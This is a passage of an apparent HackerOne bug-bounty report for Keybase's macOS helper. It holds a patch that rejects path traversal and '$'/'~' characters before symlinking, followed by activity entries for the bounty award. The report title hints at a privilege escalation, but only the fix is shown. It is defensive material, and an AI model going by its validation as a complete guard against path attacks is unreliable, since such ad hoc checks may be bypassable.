    if ([v[i] isEqualToString:@\".\"]) {\n+            return YES;\n+        }\n+    }\n+\n+    // Do not allow ~ or $ characters in the path.\n+    if ([path rangeOfString:@\"$\"].location != NSNotFound) {\n+        return YES;\n+    }\n+    if ([path rangeOfString:@\"~\"].location != NSNotFound) {\n+        return YES;\n+    }\n+    return NO;\n+}\n+\n /*\n  * check that the path path has the prefix prefix, being wise to\n  * whatever attacks people will throw at us, like /a/b/../../.., etc\n@@ -75,8 +96,14 @@ +(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix {\n     if (!path.absolutePath) {\n         return NO;\n     }\n-    NSArray *a = [path.stringByStandardizingPath componentsSeparatedByString:@\"/\"];\n-    NSArray *b = [prefix.stringByStandardizingPath componentsSeparatedByString:@\"/\"];\n+    if ([self checkIfPathIsFishy:path]) {\n+        return NO;\n+    }\n+    if ([self checkIfPathIsFishy:prefix]) {\n+        return NO;\n+    }\n+    NSArray *a = [path   componentsSeparatedByString:@\"/\"];\n+    NSArray *b = [prefix componentsSeparatedByString:@\"/\"];\n     if (a.count \u003c b.count) {\n         return NO;\n     }\ndiff --git a/osx/Installer/Info.plist b/osx/Installer/Info.plist\nindex 6eb5d913fc..5afd655916 100644\n--- a/osx/Installer/Info.plist\n+++ b/osx/Installer/Info.plist\n@@ -25,9 +25,9 @@\n \t\u003ckey\u003eKBFuseVersion\u003c/key\u003e\n \t\u003cstring\u003e3.8.2\u003c/string\u003e\n \t\u003ckey\u003eKBHelperBuild\u003c/key\u003e\n-\t\u003cstring\u003e1.0.35\u003c/string\u003e\n+\t\u003cstring\u003e1.0.36\u003c/string\u003e\n \t\u003ckey\u003eKBHelperVersion\u003c/key\u003e\n-\t\u003cstring\u003e1.0.35\u003c/string\u003e\n+\t\u003cstring\u003e1.0.36\u003c/string\u003e\n \t\u003ckey\u003eLSMinimumSystemVersion\u003c/key\u003e\n \t\u003cstring\u003e$(MACOSX_DEPLOYMENT_TARGET)\u003c/string\u003e\n \t\u003ckey\u003eLSUIElement\u003c/key\u003e\ndiff --git a/osx/KBKit/KBKit/Component/KBCommandLine.m b/osx/KBKit/KBKit/Component/KBCommandLine.m\nindex 1be37198f5..5036e71491 100644\n--- a/osx/KBKit/KBKit/Component/KBCommandLine.m\n+++ b/osx/KBKit/KBKit/Component/KBCommandLine.m\n@@ -34,8 +34,14 @@ - (void)install:(KBCompletion)completion {\n     return;\n   }\n \n+  if (![KBFSUtils checkAbsolutePath:self.servicePath hasAbsolutePrefix:@\"/Applications/Keybase.app\"]) {\n+    completion(KBMakeWarning(@\"Can only link to commands in the installed Keybase app bundle (%@ didn't suffice)\", self.servicePath));\n+    return;\n+  }\n+\n   NSDictionary *params = @{@\"directory\": self.servicePath, @\"name\": self.config.serviceBinName, @\"appName\": self.config.appName};\n   DDLogDebug(@\"Helper: addToPath(%@)\", params);\n+\n   [self.helperTool.helper sendRequest:@\"addToPath\" params:@[params] completion:^(NSError *error, id value) {\n     DDLogDebug(@\"Result: %@\", value);\n     if (error) {\ndiff --git a/osx/KBKit/KBKit/Component/KBComponent.h b/osx/KBKit/KBKit/Component/KBComponent.h\nindex 1e5336cdc6..fb04079aab 100644\n--- a/osx/KBKit/KBKit/Component/KBComponent.h\n+++ b/osx/KBKit/KBKit/Component/KBComponent.h\n@@ -30,4 +30,9 @@ typedef void (^KBRefreshComponentCompletion)(KBComponentStatus *componentStatus)\n \n - (instancetype)initWithName:(NSString *)name info:(NSString *)info image:(NSImage *)image;\n \n+@end\n+\n+@interface KBFSUtils : NSObject\n++(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix;\n++(BOOL)checkIfPathIsFishy:(NSString *)path;\n @end\n\\ No newline at end of file\ndiff --git a/osx/KBKit/KBKit/Component/KBComponent.m b/osx/KBKit/KBKit/Component/KBComponent.m\nindex 881455ed33..fdc89fc35f 100644\n--- a/osx/KBKit/KBKit/Component/KBComponent.m\n+++ b/osx/KBKit/KBKit/Component/KBComponent.m\n@@ -34,3 +34,58 @@ - (void)refreshComponent:(KBRefreshComponentCompletion)completion { completion(n\n @end\n \n \n+@implementation KBFSUtils\n+\n++(BOOL)checkIfPathIsFishy:(NSString *)path {\n+    NSArray *v = [path componentsSeparatedByString:@\"/\"];\n+    for (int i = 0; i \u003c v.count; i++) {\n+        if ([v[i] isEqualToString:@\"..\"]) {\n+            return YES;\n+        }\n+        if ([v[i] isEqualToString:@\".\"]) {\n+            return YES;\n+        }\n+    }\n+\n+    // Do not allow ~ or $ characters in the path.\n+    if ([path rangeOfString:@\"$\"].location != NSNotFound) {\n+        return YES;\n+    }\n+    if ([path rangeOfString:@\"~\"].location != NSNotFound) {\n+        return YES;\n+    }\n+    return NO;\n+}\n+\n+/*\n+ * check that the path path has the prefix prefix, being wise to\n+ * whatever attacks people will throw at us, like /a/b/../../.., etc\n+ */\n++(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix {\n+    if (!prefix.absolutePath) {\n+        return NO;\n+    }\n+    if (!path.absolutePath) {\n+        return NO;\n+    }\n+    if ([self checkIfPathIsFishy:path]) {\n+        return NO;\n+    }\n+    if ([self checkIfPathIsFishy:prefix]) {\n+        return NO;\n+    }\n+    NSArray *a = [path   componentsSeparatedByString:@\"/\"];\n+    NSArray *b = [prefix componentsSeparatedByString:@\"/\"];\n+    if (a.count \u003c b.count) {\n+        return NO;\n+    }\n+\n+    for (int i = 0; i \u003c b.count; i++) {\n+        if (![a[i] isEqualToString:b[i]]) {\n+            return NO;\n+        }\n+    }\n+    return YES;\n+}\n+\n+@end\ndiff --git a/osx/KBKit/KBKit/Component/KBHelperTool.m b/osx/KBKit/KBKit/Component/KBHelperTool.m\nindex d164fcc805..4ec0504b00 100644\n--- a/osx/KBKit/KBKit/Component/KBHelperTool.m\n+++ b/osx/KBKit/KBKit/Component/KBHelperTool.m\n@@ -83,14 +83,24 @@ - (void)doInstallAlert:(KBSemVersion *)bundleVersion runningVersion:(KBSemVersio\n \n   NSString *alertText = @\"Keybase is about to upgrade the Keybase file system, allowing end-to-end encrypted files from right inside your Finder.\";\n   NSString *infoText = @\"\";\n-  if ([bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.31\"]]) {\n+\n+  BOOL multiUser = [bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.31\"]];\n+  BOOL securityUpdate = (\n+    [bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.32\"]] ||\n+    [bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.33\"]] ||\n+    [bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.34\"]] ||\n+    [bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.36\"]]\n+  );\n+  BOOL activeDirectory = [bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.35\"]];\n+\n+  if (multiUser) {\n     alertText = @\"New Keybase feature: multiple users in macOS\";\n     // Use a division slash instead of a regular / to avoid weird line breaks.\n     infoText = @\"Previously, only one user of this computer could find their Keybase files at \\u2215keybase. With this update, \\u2215keybase will now support multiple users on the same computer by linking to user-specific Keybase directories in \\u2215Volumes.\\n\\nYou may need to enter your password for this update.\";\n-  } else if ([bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.32\"]] || [bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.33\"]] || [bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.34\"]]) {\n+  } else if (securityUpdate) {\n     alertText = @\"Keybase helper update\";\n     infoText = @\"This Keybase release contains security updates to the helper tool.\\n\\nYou may need to enter your password for this update.\";\n-  } else if ([bundleVersion isOrderedSame:[KBSemVersion version:@\"1.0.35\"]]) {\n+  } else if (activeDirectory) {\n     alertText = @\"Keybase helper update\";\n     infoText = @\"This Keybase release fixes a regression in macOS installs that use Active Directory for user management.\\n\\nYou may need to enter your password for this update.\";\n   }\n```","markdown_message":"\u003cp\u003eHere\u0026#39;s the patch, it\u0026#39;s fixed twice:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/osx/Helper/Info.plist b/osx/Helper/Info.plist\nindex 5d87712bde..b3eef1e9a3 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/Helper/Info.plist\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/Helper/Info.plist\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -9,11 +9,11 @@\u003c/span\u003e\n    \u0026lt;key\u0026gt;CFBundleName\u0026lt;/key\u0026gt;\n    \u0026lt;string\u0026gt;Helper\u0026lt;/string\u0026gt;\n    \u0026lt;key\u0026gt;CFBundleVersion\u0026lt;/key\u0026gt;\n\u003cspan class=\"gd\"\u003e-   \u0026lt;string\u0026gt;1.0.35\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+   \u0026lt;string\u0026gt;1.0.36\u0026lt;/string\u0026gt;\n\u003c/span\u003e    \u0026lt;key\u0026gt;KBBuild\u0026lt;/key\u0026gt;\n    \u0026lt;string\u0026gt;3\u0026lt;/string\u0026gt;\n    \u0026lt;key\u0026gt;CFBundleShortVersionString\u0026lt;/key\u0026gt;\n\u003cspan class=\"gd\"\u003e-   \u0026lt;string\u0026gt;1.0.35\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+   \u0026lt;string\u0026gt;1.0.36\u0026lt;/string\u0026gt;\n\u003c/span\u003e    \u0026lt;key\u0026gt;SMAuthorizedClients\u0026lt;/key\u0026gt;\n    \u0026lt;array\u0026gt;\n        \u0026lt;string\u0026gt;anchor apple generic and (certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = \u0026amp;quot;99229SGT5K\u0026amp;quot;) and (identifier \u0026amp;quot;keybase.Installer2\u0026amp;quot; or identifier \u0026amp;quot;keybase.Keybase\u0026amp;quot;)\u0026lt;/string\u0026gt;\n\u003cspan class=\"gh\"\u003ediff --git a/osx/Helper/KBHelper.m b/osx/Helper/KBHelper.m\nindex 745a772f5a..c0342e19c9 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/Helper/KBHelper.m\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/Helper/KBHelper.m\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -176,6 +176,9 @@\u003c/span\u003e -(BOOL)_isStandardKeybaseMountPath:(NSString*)path{\n   if (!p.absolutePath) {\n     return NO;\n   }\n\u003cspan class=\"gi\"\u003e+  if ([KBFSUtils checkIfPathIsFishy:path]) {\n+    return NO;\n+  }\n\u003c/span\u003e   NSArray *a = [p componentsSeparatedByString:@\u0026quot;/\u0026quot;];\n   if (a.count != 3) {\n     return NO;\n\u003cspan class=\"p\"\u003e@@ -385,7 +388,6 @@\u003c/span\u003e - (void)addToPath:(NSString *)directory name:(NSString *)name appName:(NSString\n     NSString *neededPrefix = @\u0026quot;/Applications/Keybase.app\u0026quot;;\n\n     if ([KBFSUtils checkAbsolutePath:path hasAbsolutePrefix:neededPrefix]) {\n\u003cspan class=\"gd\"\u003e-\n\u003c/span\u003e       KBLog(@\u0026quot;Allowing creation of symlink %@ -\u0026gt; %@ since it\u0026#39;s in %@\u0026quot;, linkPath, path, neededPrefix);\n\n       // Fix the link\n\u003cspan class=\"gh\"\u003ediff --git a/osx/Helper/fs.h b/osx/Helper/fs.h\nindex 49ffa3f488..1e5252da2d 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/Helper/fs.h\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/Helper/fs.h\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -8,5 +8,6 @@\u003c/span\u003e\n +(BOOL)checkFile:(NSString *)linkPath isType:(NSFileAttributeType)fileType;\n +(void)checkKeybaseResource:(NSURL *)bin identifier:(NSString *)identifier error:(NSError **)error;\n +(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix;\n\u003cspan class=\"gi\"\u003e++(BOOL)checkIfPathIsFishy:(NSString *)path;\n\u003c/span\u003e\n @end\n\u003cspan class=\"gh\"\u003ediff --git a/osx/Helper/fs.m b/osx/Helper/fs.m\nindex f60e54b7ea..9046e16ec7 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/Helper/fs.m\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/Helper/fs.m\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -64,6 +64,27 @@\u003c/span\u003e +(void)checkKeybaseResource:(NSURL *)bin identifier:(NSString *)identifier error\n     if (keybaseRequirement) CFRelease(keybaseRequirement);\n }\n\n++(BOOL)checkIfPathIsFishy:(NSString *)path {\n\u003cspan class=\"gi\"\u003e+    NSArray *v = [path componentsSeparatedByString:@\u0026quot;/\u0026quot;];\n+    for (int i = 0; i \u0026lt; v.count; i++) {\n+        if ([v[i] isEqualToString:@\u0026quot;..\u0026quot;]) {\n+            return YES;\n+        }\n+        if ([v[i] isEqualToString:@\u0026quot;.\u0026quot;]) {\n+            return YES;\n+        }\n+    }\n+\n+    // Do not allow ~ or $ characters in the path.\n+    if ([path rangeOfString:@\u0026quot;$\u0026quot;].location != NSNotFound) {\n+        return YES;\n+    }\n+    if ([path rangeOfString:@\u0026quot;~\u0026quot;].location != NSNotFound) {\n+        return YES;\n+    }\n+    return NO;\n+}\n+\n\u003c/span\u003e /*\n  * check that the path path has the prefix prefix, being wise to\n  * whatever attacks people will throw at us, like /a/b/../../.., etc\n\u003cspan class=\"p\"\u003e@@ -75,8 +96,14 @@\u003c/span\u003e +(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix {\n     if (!path.absolutePath) {\n         return NO;\n     }\n\u003cspan class=\"gd\"\u003e-    NSArray *a = [path.stringByStandardizingPath componentsSeparatedByString:@\u0026quot;/\u0026quot;];\n-    NSArray *b = [prefix.stringByStandardizingPath componentsSeparatedByString:@\u0026quot;/\u0026quot;];\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    if ([self checkIfPathIsFishy:path]) {\n+        return NO;\n+    }\n+    if ([self checkIfPathIsFishy:prefix]) {\n+        return NO;\n+    }\n+    NSArray *a = [path   componentsSeparatedByString:@\u0026quot;/\u0026quot;];\n+    NSArray *b = [prefix componentsSeparatedByString:@\u0026quot;/\u0026quot;];\n\u003c/span\u003e     if (a.count \u0026lt; b.count) {\n         return NO;\n     }\n\u003cspan class=\"gh\"\u003ediff --git a/osx/Installer/Info.plist b/osx/Installer/Info.plist\nindex 6eb5d913fc..5afd655916 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/Installer/Info.plist\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/Installer/Info.plist\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -25,9 +25,9 @@\u003c/span\u003e\n    \u0026lt;key\u0026gt;KBFuseVersion\u0026lt;/key\u0026gt;\n    \u0026lt;string\u0026gt;3.8.2\u0026lt;/string\u0026gt;\n    \u0026lt;key\u0026gt;KBHelperBuild\u0026lt;/key\u0026gt;\n\u003cspan class=\"gd\"\u003e-   \u0026lt;string\u0026gt;1.0.35\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+   \u0026lt;string\u0026gt;1.0.36\u0026lt;/string\u0026gt;\n\u003c/span\u003e    \u0026lt;key\u0026gt;KBHelperVersion\u0026lt;/key\u0026gt;\n\u003cspan class=\"gd\"\u003e-   \u0026lt;string\u0026gt;1.0.35\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+   \u0026lt;string\u0026gt;1.0.36\u0026lt;/string\u0026gt;\n\u003c/span\u003e    \u0026lt;key\u0026gt;LSMinimumSystemVersion\u0026lt;/key\u0026gt;\n    \u0026lt;string\u0026gt;$(MACOSX_DEPLOYMENT_TARGET)\u0026lt;/string\u0026gt;\n    \u0026lt;key\u0026gt;LSUIElement\u0026lt;/key\u0026gt;\n\u003cspan class=\"gh\"\u003ediff --git a/osx/KBKit/KBKit/Component/KBCommandLine.m b/osx/KBKit/KBKit/Component/KBCommandLine.m\nindex 1be37198f5..5036e71491 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/KBKit/KBKit/Component/KBCommandLine.m\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/KBKit/KBKit/Component/KBCommandLine.m\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -34,8 +34,14 @@\u003c/span\u003e - (void)install:(KBCompletion)completion {\n     return;\n   }\n\n+  if (![KBFSUtils checkAbsolutePath:self.servicePath hasAbsolutePrefix:@\u0026quot;/Applications/Keybase.app\u0026quot;]) {\n\u003cspan class=\"gi\"\u003e+    completion(KBMakeWarning(@\u0026quot;Can only link to commands in the installed Keybase app bundle (%@ didn\u0026#39;t suffice)\u0026quot;, self.servicePath));\n+    return;\n+  }\n+\n\u003c/span\u003e   NSDictionary *params = @{@\u0026quot;directory\u0026quot;: self.servicePath, @\u0026quot;name\u0026quot;: self.config.serviceBinName, @\u0026quot;appName\u0026quot;: self.config.appName};\n   DDLogDebug(@\u0026quot;Helper: addToPath(%@)\u0026quot;, params);\n\u003cspan class=\"gi\"\u003e+\n\u003c/span\u003e   [self.helperTool.helper sendRequest:@\u0026quot;addToPath\u0026quot; params:@[params] completion:^(NSError *error, id value) {\n     DDLogDebug(@\u0026quot;Result: %@\u0026quot;, value);\n     if (error) {\n\u003cspan class=\"gh\"\u003ediff --git a/osx/KBKit/KBKit/Component/KBComponent.h b/osx/KBKit/KBKit/Component/KBComponent.h\nindex 1e5336cdc6..fb04079aab 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/KBKit/KBKit/Component/KBComponent.h\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/KBKit/KBKit/Component/KBComponent.h\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -30,4 +30,9 @@\u003c/span\u003e typedef void (^KBRefreshComponentCompletion)(KBComponentStatus *componentStatus)\n\n - (instancetype)initWithName:(NSString *)name info:(NSString *)info image:(NSImage *)image;\n\n+@end\n\u003cspan class=\"gi\"\u003e+\n+@interface KBFSUtils : NSObject\n++(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix;\n++(BOOL)checkIfPathIsFishy:(NSString *)path;\n\u003c/span\u003e @end\n\u003cspan class=\"err\"\u003e\\\u003c/span\u003e No newline at end of file\n\u003cspan class=\"gh\"\u003ediff --git a/osx/KBKit/KBKit/Component/KBComponent.m b/osx/KBKit/KBKit/Component/KBComponent.m\nindex 881455ed33..fdc89fc35f 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/KBKit/KBKit/Component/KBComponent.m\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/KBKit/KBKit/Component/KBComponent.m\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -34,3 +34,58 @@\u003c/span\u003e - (void)refreshComponent:(KBRefreshComponentCompletion)completion { completion(n\n @end\n\n\n\u003cspan class=\"gi\"\u003e+@implementation KBFSUtils\n+\n++(BOOL)checkIfPathIsFishy:(NSString *)path {\n+    NSArray *v = [path componentsSeparatedByString:@\u0026quot;/\u0026quot;];\n+    for (int i = 0; i \u0026lt; v.count; i++) {\n+        if ([v[i] isEqualToString:@\u0026quot;..\u0026quot;]) {\n+            return YES;\n+        }\n+        if ([v[i] isEqualToString:@\u0026quot;.\u0026quot;]) {\n+            return YES;\n+        }\n+    }\n+\n+    // Do not allow ~ or $ characters in the path.\n+    if ([path rangeOfString:@\u0026quot;$\u0026quot;].location != NSNotFound) {\n+        return YES;\n+    }\n+    if ([path rangeOfString:@\u0026quot;~\u0026quot;].location != NSNotFound) {\n+        return YES;\n+    }\n+    return NO;\n+}\n+\n+/*\n+ * check that the path path has the prefix prefix, being wise to\n+ * whatever attacks people will throw at us, like /a/b/../../.., etc\n+ */\n++(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix {\n+    if (!prefix.absolutePath) {\n+        return NO;\n+    }\n+    if (!path.absolutePath) {\n+        return NO;\n+    }\n+    if ([self checkIfPathIsFishy:path]) {\n+        return NO;\n+    }\n+    if ([self checkIfPathIsFishy:prefix]) {\n+        return NO;\n+    }\n+    NSArray *a = [path   componentsSeparatedByString:@\u0026quot;/\u0026quot;];\n+    NSArray *b = [prefix componentsSeparatedByString:@\u0026quot;/\u0026quot;];\n+    if (a.count \u0026lt; b.count) {\n+        return NO;\n+    }\n+\n+    for (int i = 0; i \u0026lt; b.count; i++) {\n+        if (![a[i] isEqualToString:b[i]]) {\n+            return NO;\n+        }\n+    }\n+    return YES;\n+}\n+\n+@end\n\u003c/span\u003e\u003cspan class=\"gh\"\u003ediff --git a/osx/KBKit/KBKit/Component/KBHelperTool.m b/osx/KBKit/KBKit/Component/KBHelperTool.m\nindex d164fcc805..4ec0504b00 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/osx/KBKit/KBKit/Component/KBHelperTool.m\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/osx/KBKit/KBKit/Component/KBHelperTool.m\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -83,14 +83,24 @@\u003c/span\u003e - (void)doInstallAlert:(KBSemVersion *)bundleVersion runningVersion:(KBSemVersio\n\n   NSString *alertText = @\u0026quot;Keybase is about to upgrade the Keybase file system, allowing end-to-end encrypted files from right inside your Finder.\u0026quot;;\n   NSString *infoText = @\u0026quot;\u0026quot;;\n\u003cspan class=\"gd\"\u003e-  if ([bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.31\u0026quot;]]) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+\n+  BOOL multiUser = [bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.31\u0026quot;]];\n+  BOOL securityUpdate = (\n+    [bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.32\u0026quot;]] ||\n+    [bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.33\u0026quot;]] ||\n+    [bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.34\u0026quot;]] ||\n+    [bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.36\u0026quot;]]\n+  );\n+  BOOL activeDirectory = [bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.35\u0026quot;]];\n+\n+  if (multiUser) {\n\u003c/span\u003e     alertText = @\u0026quot;New Keybase feature: multiple users in macOS\u0026quot;;\n     // Use a division slash instead of a regular / to avoid weird line breaks.\n     infoText = @\u0026quot;Previously, only one user of this computer could find their Keybase files at \\u2215keybase. With this update, \\u2215keybase will now support multiple users on the same computer by linking to user-specific Keybase directories in \\u2215Volumes.\\n\\nYou may need to enter your password for this update.\u0026quot;;\n\u003cspan class=\"gd\"\u003e-  } else if ([bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.32\u0026quot;]] || [bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.33\u0026quot;]] || [bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.34\u0026quot;]]) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  } else if (securityUpdate) {\n\u003c/span\u003e     alertText = @\u0026quot;Keybase helper update\u0026quot;;\n     infoText = @\u0026quot;This Keybase release contains security updates to the helper tool.\\n\\nYou may need to enter your password for this update.\u0026quot;;\n\u003cspan class=\"gd\"\u003e-  } else if ([bundleVersion isOrderedSame:[KBSemVersion version:@\u0026quot;1.0.35\u0026quot;]]) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  } else if (activeDirectory) {\n\u003c/span\u003e     alertText = @\u0026quot;Keybase helper update\u0026quot;;\n     infoText = @\u0026quot;This Keybase release fixes a regression in macOS installs that use Active Directory for user management.\\n\\nYou may need to enter your password for this update.\u0026quot;;\n   }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-01-28T15:15:29.518Z","updated_at":"2019-01-28T15:15:29.518Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4087573,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-03T16:28:35.884Z","updated_at":"2019-02-03T16:28:35.884Z","additional_data":{"duplicate_report_id":490630},"actor":{"username":"grigoritchy","cleared":false,"url":"/grigoritchy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4115206,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-08T14:47:48.071Z","updated_at":"2019-02-08T14:47:48.071Z","additional_data":{"old_title":"From nobody to root","new_title":"From nobody to somebody"},"actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4115214,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This report wouldn't load for a long time, we closed it as part of #490960\t\n","markdown_message":"\u003cp\u003eThis report wouldn\u0026#39;t load for a long time, we closed it as part of \u003ca href=\"/reports/490960\"\u003e#490960\u003c/a\u003e  \u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-08T14:49:25.524Z","updated_at":"2019-02-08T14:49:25.524Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4115215,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-08T14:49:36.668Z","updated_at":"2019-02-08T14:49:36.668Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"u3mur4","url":"/u3mur4"},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4115224,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"(Also added additional bounty on this for a bonus)","markdown_message":"\u003cp\u003e(Also added additional bounty on this for a bonus)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-08T14:50:07.743Z","updated_at":"2019-02-08T14:50:07.743Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Keybase"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"u3mur4","url":"/u3mur4"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4117106,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The bonus was an awesome surprise. Thank you! ","markdown_message":"\u003cp\u003eThe bonus was an awesome surprise. Thank you! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-08T20:53:48.109Z","updated_at":"2019-02-08T20:53:48.109Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4117145,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you again for the great work.","markdown_message":"\u003cp\u003eThank you again for the great 